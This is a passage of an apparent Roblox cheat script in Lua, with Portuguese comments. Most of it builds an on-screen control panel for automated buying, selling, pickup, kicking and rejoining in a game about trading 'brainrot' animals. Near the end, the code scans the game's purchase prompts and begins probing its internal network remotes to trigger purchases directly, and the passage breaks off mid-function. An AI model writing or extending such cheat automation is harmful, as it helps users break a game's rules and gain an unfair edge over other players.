    minBtn.TextColor3            = Color3.fromRGB(80, 82, 110)
    minBtn.AutoButtonColor       = false

    -- Linha divisória header
    local hDiv = Instance.new("Frame", panel)
    hDiv.Size                    = UDim2.new(1, -20, 0, 1)
    hDiv.BackgroundColor3        = Color3.fromRGB(22, 22, 35)
    hDiv.BackgroundTransparency  = 0
    hDiv.BorderSizePixel         = 0
    hDiv.LayoutOrder             = 1

    -- Drag
    do
        local dragging, ds, dp = false, nil, nil
        header.InputBegan:Connect(function(i)
            if Config.MiniUILocked then return end
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = true; ds = i.Position; dp = panel.AbsolutePosition
            end
        end)
        UserInputService.InputChanged:Connect(function(i)
            if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
                local d = i.Position - ds
                panel.Position = UDim2.new(0, dp.X + d.X, 0, dp.Y + d.Y)
            end
        end)
        UserInputService.InputEnded:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 and dragging then
                dragging = false
                local ps = panel.Parent.AbsoluteSize
                Config.MiniUIPos = { X = panel.AbsolutePosition.X / ps.X, Y = panel.AbsolutePosition.Y / ps.Y }
                SaveConfig()
            end
        end)
    end

    -- ── BODY recolhível ───────────────────────────────────────────────────
    local bodyFrame = Instance.new("Frame", panel)
    bodyFrame.Name               = "Body"
    bodyFrame.Size               = UDim2.new(1, 0, 0, 0)
    bodyFrame.AutomaticSize      = Enum.AutomaticSize.Y
    bodyFrame.BackgroundTransparency = 1
    bodyFrame.LayoutOrder        = 2

    local bodyPad = Instance.new("UIPadding", bodyFrame)
    bodyPad.PaddingLeft  = UDim.new(0, 8)
    bodyPad.PaddingRight = UDim.new(0, 8)
    bodyPad.PaddingTop   = UDim.new(0, 6)
    bodyPad.PaddingBottom = UDim.new(0, 8)

    local bodyLayout = Instance.new("UIListLayout", bodyFrame)
    bodyLayout.FillDirection     = Enum.FillDirection.Horizontal
    bodyLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
    bodyLayout.VerticalAlignment = Enum.VerticalAlignment.Top
    bodyLayout.Wraps             = true
    bodyLayout.SortOrder         = Enum.SortOrder.LayoutOrder
    bodyLayout.Padding           = UDim.new(0, 3)

    local cont = bodyFrame
    local collapsed = false
    minBtn.MouseButton1Click:Connect(function()
        collapsed = not collapsed
        bodyFrame.Visible = not collapsed
        minBtn.Text = collapsed and "+" or "-"
    end)

    -- ── HELPERS ──────────────────────────────────────────────────────────

    -- Grupo label (super fino)
    local function miniSec(lbl, ord)
        local r = Instance.new("Frame", cont)
        r.Size               = UDim2.new(1, 0, 0, 13)
        r.BackgroundTransparency = 1
        r.LayoutOrder        = ord
        local t = Instance.new("TextLabel", r)
        t.Size               = UDim2.new(1, 0, 1, 0)
        t.BackgroundTransparency = 1
        t.Text               = lbl
        t.Font               = Enum.Font.GothamBold
        t.TextSize           = 8
        t.TextColor3         = Color3.fromRGB(60, 62, 88)
        t.TextXAlignment     = Enum.TextXAlignment.Left
        local ln = Instance.new("Frame", r)
        ln.Size              = UDim2.new(1, 0, 0, 1)
        ln.Position          = UDim2.new(0, 0, 1, -1)
        ln.BackgroundColor3  = Color3.fromRGB(18, 18, 28)
        ln.BorderSizePixel   = 0
    end

    -- Botão de ação full-width
    local function mBtn(lbl, order, col, cb)
        local b = Instance.new("TextButton", cont)
        b.Size               = UDim2.new(0.5, -2, 0, BTN_H + 8)  -- metade da largura (2 por linha)
        b.BackgroundColor3   = col or Color3.fromRGB(14, 14, 20)
        b.BackgroundTransparency = 0.08
        b.Text               = lbl
        b.Font               = Enum.Font.GothamBold
        b.TextSize           = 10
        b.TextColor3         = Color3.fromRGB(185, 188, 215)
        b.BorderSizePixel    = 0
        b.AutoButtonColor    = false
        b.LayoutOrder        = order
        b.TextXAlignment     = Enum.TextXAlignment.Center
        b.TextWrapped        = true
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 7)
        local st = Instance.new("UIStroke", b)
        st.Color = Color3.fromRGB(45, 45, 60)
        st.Thickness = 1
        st.Transparency = 0.3
        b.MouseButton1Click:Connect(cb)
        return b
    end

    -- Toggle row (label + switch minimalista)
    local function mToggle(lbl, order, getState, onToggle)
        local row = Instance.new("Frame", cont)
        row.Size             = UDim2.new(1, 0, 0, BTN_H)
        row.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
        row.BackgroundTransparency = 0.12
        row.BorderSizePixel  = 0
        row.LayoutOrder      = order
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 6)

        local lbl_el = Instance.new("TextLabel", row)
        lbl_el.Size          = UDim2.new(1, -54, 1, 0)
        lbl_el.Position      = UDim2.new(0, 10, 0, 0)
        lbl_el.BackgroundTransparency = 1
        lbl_el.Text          = lbl
        lbl_el.Font          = Enum.Font.GothamBold
        lbl_el.TextSize      = 10
        lbl_el.TextColor3    = Color3.fromRGB(185, 188, 215)
        lbl_el.TextXAlignment = Enum.TextXAlignment.Left

        local sw = Instance.new("Frame", row)
        sw.Size              = UDim2.new(0, 32, 0, 15)
        sw.Position          = UDim2.new(1, -40, 0.5, -7)
        sw.BackgroundColor3  = getState() and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(30, 30, 46)
        sw.BorderSizePixel   = 0
        Instance.new("UICorner", sw).CornerRadius = UDim.new(1, 0)

        local dot = Instance.new("Frame", sw)
        dot.Size             = UDim2.new(0, 11, 0, 11)
        dot.Position         = getState() and UDim2.new(1,-13,0.5,-5) or UDim2.new(0,2,0.5,-5)
        dot.BackgroundColor3 = Color3.new(1,1,1)
        dot.BorderSizePixel  = 0
        Instance.new("UICorner", dot).CornerRadius = UDim.new(1,0)

        local btn = Instance.new("TextButton", sw)
        btn.Size             = UDim2.new(1,0,1,0)
        btn.BackgroundTransparency = 1
        btn.Text             = ""
        btn.AutoButtonColor  = false

        local function refresh()
            local on = getState()
            sw.BackgroundColor3 = on and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(30,30,46)
            dot.Position        = on and UDim2.new(1,-13,0.5,-5) or UDim2.new(0,2,0.5,-5)
        end
        btn.MouseButton1Click:Connect(function() onToggle(); refresh() end)
        return { refresh=refresh }
    end

    -- Slider
    local function mSlider(parent, lbl, ord, minV, maxV, getV, setV)
        local r = Instance.new("Frame", parent)
        r.Size               = UDim2.new(1, 0, 0, 42)
        r.BackgroundColor3   = Color3.fromRGB(14, 14, 20)
        r.BackgroundTransparency = 0.12
        r.BorderSizePixel    = 0
        r.LayoutOrder        = ord
        Instance.new("UICorner", r).CornerRadius = UDim.new(0, 6)

        local lText = Instance.new("TextLabel", r)
        lText.Size           = UDim2.new(1, -10, 0, 14)
        lText.Position       = UDim2.new(0, 10, 0, 4)
        lText.BackgroundTransparency = 1
        lText.Font           = Enum.Font.GothamBold
        lText.TextSize       = 9
        lText.TextColor3     = Color3.fromRGB(150, 153, 185)
        lText.TextXAlignment = Enum.TextXAlignment.Left
        lText.Text           = lbl .. getV()

        local track = Instance.new("Frame", r)
        track.Size           = UDim2.new(1, -20, 0, 4)
        track.Position       = UDim2.new(0, 10, 0, 26)
        track.BackgroundColor3 = Color3.fromRGB(22, 22, 35)
        track.BorderSizePixel = 0
        Instance.new("UICorner", track).CornerRadius = UDim.new(1,0)

        local fill = Instance.new("Frame", track)
        fill.BackgroundColor3 = Color3.fromRGB(90, 140, 255)
        fill.BorderSizePixel = 0
        Instance.new("UICorner", fill).CornerRadius = UDim.new(1,0)

        local knob = Instance.new("Frame", track)
        knob.Size            = UDim2.new(0, 11, 0, 11)
        knob.AnchorPoint     = Vector2.new(0.5, 0.5)
        knob.BackgroundColor3 = Color3.fromRGB(210, 213, 240)
        knob.BorderSizePixel = 0
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1,0)

        local function setV2(v)
            v = math.clamp(math.floor(v+0.5), minV, maxV)
            local p = (v-minV)/(maxV-minV)
            fill.Size        = UDim2.new(p,0,1,0)
            knob.Position    = UDim2.new(p,0,0.5,0)
            lText.Text       = lbl .. v
            return v
        end
        setV2(getV())

        local drag = false
        track.InputBegan:Connect(function(i)
            if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
                drag=true
                setV(setV2(minV+math.clamp((i.Position.X-track.AbsolutePosition.X)/track.AbsoluteSize.X,0,1)*(maxV-minV)))
            end
        end)
        UserInputService.InputEnded:Connect(function(i)
            if i.UserInputType==Enum.UserInputType.MouseButton1 then drag=false end
        end)
        UserInputService.InputChanged:Connect(function(i)
            if drag and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
                setV(setV2(minV+math.clamp((i.Position.X-track.AbsolutePosition.X)/track.AbsoluteSize.X,0,1)*(maxV-minV)))
            end
        end)
        return lText
    end

    -- Keybind
    local function mKey(parent, lbl, ord, getK, setK)
        local r = Instance.new("Frame", parent)
        r.Size               = UDim2.new(1, 0, 0, BTN_H)
        r.BackgroundColor3   = Color3.fromRGB(14, 14, 20)
        r.BackgroundTransparency = 0.12
        r.BorderSizePixel    = 0
        r.LayoutOrder        = ord
        Instance.new("UICorner", r).CornerRadius = UDim.new(0, 6)
        local lText = Instance.new("TextLabel", r)
        lText.Size           = UDim2.new(1,-60,1,0)
        lText.Position       = UDim2.new(0,10,0,0)
        lText.BackgroundTransparency = 1
        lText.Text           = lbl
        lText.Font           = Enum.Font.GothamBold
        lText.TextSize       = 10
        lText.TextColor3     = Color3.fromRGB(150,153,185)
        lText.TextXAlignment = Enum.TextXAlignment.Left
        local kb = Instance.new("TextButton", r)
        kb.Size              = UDim2.new(0,42,0,19)
        kb.Position          = UDim2.new(1,-48,0.5,-9)
        kb.BackgroundColor3  = Color3.fromRGB(20, 20, 32)
        kb.BackgroundTransparency = 0
        kb.Text              = getK()
        kb.Font              = Enum.Font.GothamBold
        kb.TextSize          = 9
        kb.TextColor3        = Color3.fromRGB(100,150,255)
        kb.BorderSizePixel   = 0
        kb.AutoButtonColor   = false
        Instance.new("UICorner", kb).CornerRadius = UDim.new(0,5)
        local listening = false
        kb.MouseButton1Click:Connect(function()
            if listening then return end
            listening=true; kb.Text="..."
            local conn
            conn=UserInputService.InputBegan:Connect(function(i,gp)
                if gp then return end
                if i.UserInputType==Enum.UserInputType.Keyboard then
                    local n=i.KeyCode.Name
                    if n and n~="Unknown" then setK(n); kb.Text=n; SaveConfig() end
                end
                listening=false; conn:Disconnect()
            end)
            task.delay(5,function()
                if listening then listening=false; conn:Disconnect(); kb.Text=getK() end
            end)
        end)
        return kb
    end

    -- ── AUTO ────────────────────────────────────────────────────────────
    miniSec("AUTO", 30)
    local abBackBtn = mBtn("Auto Back: OFF", 31, Color3.fromRGB(14,14,20), function() end)
    local function updABMini()
        local on = Config.AutoBack
        abBackBtn.Text = on and "Auto Back: ON" or "Auto Back: OFF"
        abBackBtn.BackgroundColor3 = on and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(14,14,20)
        abBackBtn.TextColor3 = on and Color3.new(0, 0, 0) or Color3.fromRGB(185,188,215)
    end
    updABMini()
    abBackBtn.MouseButton1Click:Connect(function()
        Config.AutoBack = not Config.AutoBack
        SaveConfig()
        if Config.AutoBack and _G.startAutoBack then
            pcall(_G.startAutoBack)
        elseif _G.stopAutoBack then
            pcall(_G.stopAutoBack)
        end
        updABMini()
        if _G._autoBackSettingsRefresh then pcall(_G._autoBackSettingsRefresh) end
    end)

    _G._autoBackMiniRefresh = updABMini

    do
        local akBtn = mBtn("Auto Kick: OFF", 32, Color3.fromRGB(14,14,20), function() end)

        local function updateAKBtn()
            local on = Config.AutoKickOnSteal
            akBtn.Text = on and "Auto Kick: ON" or "Auto Kick: OFF"
            akBtn.BackgroundColor3 = on and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(14,14,20)
            akBtn.TextColor3 = on and Color3.new(0, 0, 0) or Color3.fromRGB(185,188,215)
        end
        updateAKBtn()

        akBtn.MouseButton1Click:Connect(function()
            Config.AutoKickOnSteal = not Config.AutoKickOnSteal
            SaveConfig()
            updateAKBtn()
            if _G.setAutoKickFromSettings then
                _G.setAutoKickFromSettings(Config.AutoKickOnSteal)
            end
        end)

        _G.setAutoKickFromMiniUI = updateAKBtn
    end

    _G.setAutoKickFromSettings = function(val)
        Config.AutoKickOnSteal = val
        SaveConfig()
        if _G.setAutoKickFromMiniUI then _G.setAutoKickFromMiniUI() end
    end

    -- ── PICKUP (lógica EXATA importada do hub Logística) ────────────────
    miniSec("PICKUP", 35)
    do
        local pickupBtn = mBtn("Auto Pickup: OFF", 36, Color3.fromRGB(14,14,20), function() end)
        local function updPickupBtn()
            local on = Config.AutoPickupActive == true
            pickupBtn.Text = on and "Auto Pickup: ON" or "Auto Pickup: OFF"
            pickupBtn.BackgroundColor3 = on and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(14,14,20)
            pickupBtn.TextColor3 = on and Color3.new(0, 0, 0) or Color3.fromRGB(185,188,215)
        end
        updPickupBtn()
        pickupBtn.MouseButton1Click:Connect(function()
            if _G.AutoPickupToggle then
                pcall(_G.AutoPickupToggle)
            else
                Config.AutoPickupActive = not (Config.AutoPickupActive == true)
                SaveConfig()
            end
            updPickupBtn()
        end)

        local kickPkBtn = mBtn("Pickup Kick: OFF", 37, Color3.fromRGB(14,14,20), function() end)
        local function updKickPkBtn()
            local on = Config.AutoPickupKick == true
            kickPkBtn.Text = on and "Pickup Kick: ON" or "Pickup Kick: OFF"
            kickPkBtn.BackgroundColor3 = on and Color3.fromRGB(200, 60, 60) or Color3.fromRGB(14,14,20)
            kickPkBtn.TextColor3 = on and Color3.new(1, 1, 1) or Color3.fromRGB(185,188,215)
        end
        updKickPkBtn()
        kickPkBtn.MouseButton1Click:Connect(function()
            Config.AutoPickupKick = not (Config.AutoPickupKick == true)
            SaveConfig()
            updKickPkBtn()
            ShowNotification("PICKUP KICK", Config.AutoPickupKick and "ATIVADO" or "DESATIVADO")
        end)

        mKey(cont, "Pickup Key", 38,
            function() return Config.AutoPickupKey or "B" end,
            function(v) Config.AutoPickupKey = v end)

        _G._pickupMiniRefresh = updPickupBtn
    end

    -- ── REJOIN + KICK (mesma linha) ─────────────────────────────────────
    miniSec("SESSÃO", 40)
    do
        local kickKey = Config.KickKey ~= "" and Config.KickKey or "NONE"
        local row = Instance.new("Frame", cont)
        row.Size = UDim2.new(1, 0, 0, BTN_H)
        row.BackgroundTransparency = 1
        row.LayoutOrder = 41

        local rej = Instance.new("TextButton", row)
        rej.Size = UDim2.new(0.5, -3, 1, 0)
        rej.Position = UDim2.new(0, 0, 0, 0)
        rej.BackgroundColor3 = Color3.fromRGB(14,14,20)
        rej.BackgroundTransparency = 0.05
        rej.Text = "Rejoin"
        rej.Font = Enum.Font.GothamBold
        rej.TextSize = 10
        rej.TextColor3 = Color3.fromRGB(185,188,215)
        rej.AutoButtonColor = false
        rej.BorderSizePixel = 0
        Instance.new("UICorner", rej).CornerRadius = UDim.new(0, 7)
        rej.MouseButton1Click:Connect(function()
            ShowNotification("REJOIN", "Reconectando...")
            task.delay(0.5, function()
                pcall(function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end)
            end)
        end)

        local kb = Instance.new("TextButton", row)
        kb.Size = UDim2.new(0.5, -3, 1, 0)
        kb.Position = UDim2.new(0.5, 3, 0, 0)
        kb.BackgroundColor3 = Color3.fromRGB(180, 40, 60)
        kb.BackgroundTransparency = 0.05
        kb.Text = "Kick (" .. kickKey .. ")"
        kb.Font = Enum.Font.GothamBold
        kb.TextSize = 10
        kb.TextColor3 = Color3.new(1, 1, 1)
        kb.AutoButtonColor = false
        kb.BorderSizePixel = 0
        Instance.new("UICorner", kb).CornerRadius = UDim.new(0, 7)
        kb.MouseButton1Click:Connect(function()
            kickPlayer()
        end)
    end

    -- ── AUTO BUY UI + BUTTON ────────────────────────────────────────────
    local autoBuyActive = false
    _G.AutoBuyEsteira   = false

    -- Destroy any leftover from previous build
    _G.rebuildAutoBuyCirclePresets = nil

    -- ── RING CIRCLE (same pattern as proxViz) ───────────────────────────
    local abRing = nil
    local function getCircleColor()
        return Color3.fromRGB(90,140,255) or Color3.fromRGB(80, 140, 255)
    end
    local function createRing()
        local existing = Workspace:FindFirstChild("XiAutoBuyRing")
        if existing then existing:Destroy() end
        local r = Instance.new("Part")
        r.Name         = "XiAutoBuyRing"
        r.Shape        = Enum.PartType.Cylinder
        r.Anchored     = true
        r.CanCollide   = false
        r.CanTouch     = false
        r.CanQuery     = false
        r.CastShadow   = false
        r.Material     = Enum.Material.Neon
        r.Transparency = 0.5
        r.Color        = getCircleColor()
        local range    = Config.AutoBuyRange or 20
        r.Size         = Vector3.new(0.5, range*2, range*2)
        r.Parent       = Workspace
        abRing = r
    end
    local function destroyRing()
        if abRing then abRing:Destroy(); abRing = nil end
        local existing = Workspace:FindFirstChild("XiAutoBuyRing")
        if existing then existing:Destroy() end
    end
    -- Expose so applyTheme can update ring color live
    _G.updateAutoBuyRingColor = function()
        if abRing and abRing.Parent then abRing.Color = getCircleColor() end
    end

    -- Follow player (same as proxViz pattern)
    RunService.Heartbeat:Connect(function()
        if not autoBuyActive then return end
        local char = LocalPlayer.Character
        local hrp  = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        if not abRing or not abRing.Parent then return end
        local range = Config.AutoBuyRange or 20
        abRing.Size  = Vector3.new(0.5, range*2, range*2)
        abRing.CFrame = hrp.CFrame * CFrame.Angles(0, 0, math.rad(90)) + Vector3.new(0, -2.5, 0)
    end)

    -- ── TOGGLE ────────────────────────────────────────────────────────────
    local function toggleAutoBuy()
        autoBuyActive = not autoBuyActive
        _G.AutoBuyEsteira = autoBuyActive
        if autoBuyActive then createRing() else destroyRing() end
        if _G.AutoBuyOnToggle then _G.AutoBuyOnToggle(autoBuyActive) end
        ShowNotification("AUTO BUY", autoBuyActive and "ATIVADO" or "DESATIVADO")
    end

    -- ── BUY / SELL ───────────────────────────────────────────────────────
    miniSec("BUY / SELL", 6)

    local BASE_C = Color3.fromRGB(14,14,20)
    local BASE_T = Color3.fromRGB(185, 188, 215)

    -- Auto Buy + Proximity Sell (mesma linha)
    local autoBuyBtn = mBtn("Auto Buy: OFF", 7, BASE_C, function() end)
    local function updABBtn()
        autoBuyBtn.Text             = autoBuyActive and "Auto Buy: ON" or "Auto Buy: OFF"
        autoBuyBtn.BackgroundColor3 = autoBuyActive and Color3.fromRGB(80, 140, 255) or BASE_C
        autoBuyBtn.TextColor3       = autoBuyActive and Color3.new(0,0,0) or BASE_T
    end
    autoBuyBtn.MouseButton1Click:Connect(function() toggleAutoBuy(); updABBtn() end)

    local proxSellBtn = mBtn("Prox Sell: OFF", 8, BASE_C, function() end)

    -- Random Sell + [S1|Sell] (mesma linha)
    local randomSellBtn = mBtn("Random Sell", 9, BASE_C, function() end)
    randomSellBtn.MouseButton1Click:Connect(function()
        if _G.BullysSellRandom then _G.BullysSellRandom() end
        TweenService:Create(randomSellBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(80, 140, 255)}):Play()
        randomSellBtn.Text = "SOLD!"; randomSellBtn.TextColor3 = Color3.new(0, 0, 0)
        task.delay(0.4, function()
            if randomSellBtn and randomSellBtn.Parent then
                TweenService:Create(randomSellBtn, TweenInfo.new(0.2), {BackgroundColor3 = BASE_C}):Play()
                randomSellBtn.Text = "Random Sell"; randomSellBtn.TextColor3 = BASE_T
            end
        end)
    end)

    -- [S1 | Sell] botão unificado (mesma linha que Random Sell)
    local selectedSellSlot = Config.SelectedSellSlot or 1
    local sellContainer = Instance.new("TextButton", cont)
    sellContainer.Size = UDim2.new(0.5, -2, 0, BTN_H + 8)
    sellContainer.Text = ""; sellContainer.AutoButtonColor = false
    sellContainer.BackgroundColor3 = BASE_C
    sellContainer.BackgroundTransparency = 0.08
    sellContainer.BorderSizePixel = 0; sellContainer.LayoutOrder = 10
    Instance.new("UICorner", sellContainer).CornerRadius = UDim.new(0, 7)
    Instance.new("UIStroke", sellContainer).Color = Color3.fromRGB(45, 45, 60)

    local slotSelectBtn = Instance.new("TextButton", sellContainer)
    slotSelectBtn.Size = UDim2.new(0, 30, 1, 0)
    slotSelectBtn.Position = UDim2.new(0, 0, 0, 0)
    slotSelectBtn.BackgroundTransparency = 1
    slotSelectBtn.Text = "S" .. selectedSellSlot
    slotSelectBtn.Font = Enum.Font.GothamBlack; slotSelectBtn.TextSize = 10
    slotSelectBtn.TextColor3 = BASE_T; slotSelectBtn.BorderSizePixel = 0
    slotSelectBtn.AutoButtonColor = false

    local divider = Instance.new("Frame", sellContainer)
    divider.Size = UDim2.new(0, 1, 0.6, 0)
    divider.Position = UDim2.new(0, 30, 0.2, 0)
    divider.BackgroundColor3 = Color3.fromRGB(45, 45, 60); divider.BorderSizePixel = 0

    local slotSellBtn = Instance.new("TextButton", sellContainer)
    slotSellBtn.Size = UDim2.new(1, -33, 1, 0)
    slotSellBtn.Position = UDim2.new(0, 33, 0, 0)
    slotSellBtn.BackgroundTransparency = 1
    slotSellBtn.Text = "Sell"; slotSellBtn.Font = Enum.Font.GothamBold
    slotSellBtn.TextSize = 10; slotSellBtn.TextColor3 = BASE_T
    slotSellBtn.BorderSizePixel = 0; slotSellBtn.AutoButtonColor = false

    -- Dropdown popup (ScreenGui separada, arrastável)
    local ddGui = PlayerGui:FindFirstChild("BullysSlotDD")
    if ddGui then ddGui:Destroy() end
    ddGui = Instance.new("ScreenGui"); ddGui.Name = "BullysSlotDD"
    ddGui.ResetOnSpawn = false; ddGui.DisplayOrder = 999; ddGui.Parent = PlayerGui
    local slotDD = Instance.new("Frame", ddGui)
    slotDD.Size = UDim2.new(0, 120, 0, 285)
    slotDD.Position = UDim2.new(0, 80, 0.5, -142)
    slotDD.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
    slotDD.BackgroundTransparency = 0.05; slotDD.BorderSizePixel = 0
    slotDD.Visible = false; slotDD.Active = true; slotDD.Draggable = true
    Instance.new("UICorner", slotDD).CornerRadius = UDim.new(0, 8)
    Instance.new("UIStroke", slotDD).Color = Color3.fromRGB(40, 42, 55)
    local ddT = Instance.new("TextLabel", slotDD)
    ddT.Size = UDim2.new(1,0,0,20); ddT.BackgroundTransparency = 1
    ddT.Text = "SELECT SLOT"; ddT.Font = Enum.Font.GothamBlack
    ddT.TextSize = 9; ddT.TextColor3 = Color3.fromRGB(100,102,120)
    local ddS = Instance.new("Frame", slotDD)
    ddS.Size = UDim2.new(1,-8,1,-24); ddS.Position = UDim2.new(0,4,0,22)
    ddS.BackgroundTransparency = 1
    local ddL = Instance.new("UIListLayout", ddS)
    ddL.Padding = UDim.new(0, 2); ddL.SortOrder = Enum.SortOrder.LayoutOrder

    local slotOpts = {}
    for s = 1, 10 do
        local opt = Instance.new("TextButton", ddS)
        opt.Size = UDim2.new(1,0,0,23); opt.BackgroundColor3 = Color3.fromRGB(20,20,28)
        opt.BackgroundTransparency = 0.15; opt.Text = "Slot " .. s
        opt.Font = Enum.Font.GothamBold; opt.TextSize = 11
        opt.TextColor3 = Color3.fromRGB(200,202,220); opt.BorderSizePixel = 0
        opt.AutoButtonColor = false; opt.LayoutOrder = s
        Instance.new("UICorner", opt).CornerRadius = UDim.new(0, 5)
        local oStk = Instance.new("UIStroke", opt)
        oStk.Color = (s == selectedSellSlot) and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(30,30,40)
        oStk.Thickness = (s == selectedSellSlot) and 1.5 or 1; oStk.Transparency = 0.2
        slotOpts[s] = {btn = opt, stroke = oStk}
        opt.MouseButton1Click:Connect(function()
            selectedSellSlot = s; Config.SelectedSellSlot = s; pcall(SaveConfig)
            slotSelectBtn.Text = "S" .. s; slotDD.Visible = false
            for idx, d in pairs(slotOpts) do
                d.stroke.Color = (idx == s) and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(30,30,40)
                d.stroke.Thickness = (idx == s) and 1.5 or 1
            end
        end)
    end

    slotSelectBtn.MouseButton1Click:Connect(function()
        if slotDD.Visible then slotDD.Visible = false else
            local p = slotSelectBtn.AbsolutePosition
            slotDD.Position = UDim2.new(0, p.X - 125, 0, p.Y - 140)
            slotDD.Visible = true
        end
    end)

    slotSellBtn.MouseButton1Click:Connect(function()
        slotDD.Visible = false
        if _G.BullysSellSlot then _G.BullysSellSlot(selectedSellSlot) end
        TweenService:Create(sellContainer, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(80, 140, 255)}):Play()
        slotSellBtn.Text = "SOLD!"; slotSellBtn.TextColor3 = Color3.new(0,0,0)
        slotSelectBtn.TextColor3 = Color3.new(0,0,0)
        task.delay(0.4, function()
            if sellContainer and sellContainer.Parent then
                TweenService:Create(sellContainer, TweenInfo.new(0.2), {BackgroundColor3 = BASE_C}):Play()
                slotSellBtn.Text = "Sell"; slotSellBtn.TextColor3 = BASE_T
                slotSelectBtn.TextColor3 = BASE_T
            end
        end)
    end)

    -- Range + Buy Key (abaixo, compactos)
    mSlider(cont, "Range: ", 11, 5, 50,
        function() return Config.AutoBuyRange or 20 end,
        function(v) Config.AutoBuyRange = v; SaveConfig() end)
    mKey(cont, "Buy Key", 12,
        function() return Config.AutoBuyKey or "K" end,
        function(v) Config.AutoBuyKey = v end)
    local function updProxBtn()
        local on = _G.BullysSellIsProxActive and _G.BullysSellIsProxActive() or false
        proxSellBtn.Text             = on and "Prox Sell: ON" or "Prox Sell: OFF"
        proxSellBtn.BackgroundColor3 = on and Color3.fromRGB(80, 140, 255) or BASE_C
        proxSellBtn.TextColor3       = on and Color3.new(0,0,0) or BASE_T
    end
    proxSellBtn.MouseButton1Click:Connect(function()
        if _G.BullysSellToggleProx then _G.BullysSellToggleProx() end
        updProxBtn()
    end)
    task.defer(function() task.wait(3); updProxBtn() end)

    UserInputService.InputBegan:Connect(function(inp, gp)
        if gp then return end
        local key = Config.AutoBuyKey or "K"
        local ok, kc = pcall(function() return Enum.KeyCode[key] end)
        if ok and kc and inp.KeyCode == kc then
            toggleAutoBuy()
            autoBuyBtn.Text             = autoBuyActive and "Auto Buy: ON" or "Auto Buy: OFF"
            autoBuyBtn.BackgroundColor3 = autoBuyActive and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(14,14,20)
            autoBuyBtn.TextColor3       = autoBuyActive and Color3.new(0,0,0) or Color3.fromRGB(185,188,215)
        end
    end)

    -- Racetrack border

    -- Recreate ring on character respawn
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(0.5)
        if autoBuyActive then createRing() end
    end)

    -- ── AUTO BUY BACKEND ─────────────────────────────────────────────────
    task.spawn(function()
        local Packages = ReplicatedStorage:WaitForChild("Packages")
        local Datas    = ReplicatedStorage:WaitForChild("Datas")
        local Shared   = ReplicatedStorage:WaitForChild("Shared")
        local Utils    = ReplicatedStorage:WaitForChild("Utils")
        local AnimData   = require(Datas:WaitForChild("Animals"))
        local AnimShared = require(Shared:WaitForChild("Animals"))
        local NumUtils   = require(Utils:WaitForChild("NumberUtils"))

        local RARITY_WORDS = {common=true,uncommon=true,rare=true,epic=true,legendary=true,
            secret=true,divine=true,rainbow=true,cursed=true,gold=true,diamond=true}

        local function getBrainrotName(model)
            if not model then return "Brainrot","" end
            local nameFound,genFound = "",""
            for _, bb in ipairs(model:GetDescendants()) do
                if bb:IsA("BillboardGui") then
                    for _, lbl in ipairs(bb:GetDescendants()) do
                        if lbl:IsA("TextLabel") and lbl.Text and lbl.Text ~= "" then
                            local t = lbl.Text:match("^%s*(.-)%s*$")
                            local tl = t:lower()
                            if RARITY_WORDS[tl] then continue end
                            if t:match("^%$[%d%.]+[KkMmBb]?/s$") then
                                if genFound=="" then genFound=t end; continue
                            end
                            if t:match("^%$[%d%.]+[KkMmBb]?$") then continue end
                            if t:match("^[%d%.]+[KkMmBb]?$") then continue end
                            if nameFound=="" and #t>1 then nameFound=t end
                        end
                    end
                end
            end
            if nameFound=="" then
                pcall(function()
                    local info = AnimData[model.Name]
                    if info and info.DisplayName then
                        nameFound = info.DisplayName
                        local gv = AnimShared:GetGeneration(model.Name,nil,nil,nil)
                        genFound = "$"..NumUtils:ToString(gv).."/s"
                    end
                end)
            end
            if nameFound=="" then nameFound = model.Name~="" and model.Name or "Brainrot" end
            return nameFound,genFound
        end

        local function scanConveyor()
            local results = {}
            for _, obj in ipairs(Workspace:GetDescendants()) do
                if not (obj:IsA("ProximityPrompt") and obj.Enabled) then continue end
                local txt = obj.ActionText or ""
                if not (txt=="Purchase" or txt:lower():find("purchase") or txt:lower():find("comprar")) then continue end
                local part = obj.Parent
                if not part then continue end
                local realPart = part:IsA("Attachment") and part.Parent or part
                if not (realPart and realPart:IsA("BasePart")) then continue end
                local model,cur = nil,realPart
                for _ = 1,8 do
                    if cur and cur:IsA("Model") then model=cur; break end
                    cur = cur and cur.Parent
                end
                local name,gen = getBrainrotName(model)
                table.insert(results,{
                    name=name, gen=gen, prompt=obj, part=realPart,
                    model=model, source="ESTEIRA", uid="esteira_"..tostring(obj),
                })
            end
            return results
        end

        SharedState.ConveyorAnimals = {}
        -- Scan once immediately, then only when auto buy is activated
        local function refreshConveyor()
            local ok, found = pcall(scanConveyor)
            if ok and found then SharedState.ConveyorAnimals = found end
        end
        refreshConveyor()
        _G.refreshConveyor = refreshConveyor

        -- ── REMOTE RESOLVER ────────────────────────────────────────────
        local purchaseRemote = nil
        local function resolvePurchaseRemote()
            if purchaseRemote and purchaseRemote.Parent then return purchaseRemote end
            pcall(function()
                local net = ReplicatedStorage:FindFirstChild("Packages")
                         and ReplicatedStorage.Packages:FindFirstChild("Net")
                if not net then return end
                local kws = {"buy","purchase","animal","shop","acquire","conveyor"}
